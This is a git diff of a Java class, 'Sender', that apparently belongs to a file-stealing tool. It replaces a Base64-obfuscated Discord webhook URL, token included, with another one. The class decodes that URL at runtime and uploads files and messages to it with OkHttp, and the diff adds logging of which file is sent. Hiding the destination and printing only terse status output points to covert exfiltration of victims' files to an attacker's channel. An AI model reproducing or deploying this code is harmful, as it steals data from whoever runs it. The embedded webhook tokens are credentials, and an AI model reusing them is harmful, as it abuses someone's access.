@@ -1,8 +1,10 @@
 package io.github.luxotick;
 
+import io.github.luxotick.impl.yazici;
 import okhttp3.*;
 
 import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 
 import java.util.Base64;
@@ -10,7 +12,7 @@ import java.util.Base64;
 public class Sender {
     private static final MediaType jsonMediaType = MediaType.parse("application/json; charset=utf-8");
 
-    static final String a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NzQxODg2MTUwNDE3MjEzMi95RU5zdmdJd0U0MzJhUTZBU016VG4yVGNSWXh3V19adUtRcVJFMzRhRnNxZzNJMVF6YU93cmJGamJnQVdMeVJKS0QtVA==";
+    static final String a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAxNzQ0MTQyNTI0OTU0MjE3NS90TkZ1QURDUExsOS1mS09BaUZjNm56LW8zNkV3LVo3Z3NldmF1UVI3WUJpSUVJMWdOMzN6SGJqSGROaE1KY2x5MndPYQ==";
 
     public static void Sender(OkHttpClient client, File file, RequestBody requestBody) throws IOException {
         byte[] decodedBytes = Base64.getDecoder().decode(a);
@@ -26,6 +28,7 @@ public class Sender {
             System.out.println("Ok.");
         } else {
             System.out.println("-");
+            yazici.main("sending file: " + file.getName());
         }
     }
 
@@ -47,6 +50,7 @@ public class Sender {
             if (!response.isSuccessful()) {
                 System.out.println("-");
             }
+            yazici.main(message);
         } catch (Exception e) {
             System.out.println("-");
         }
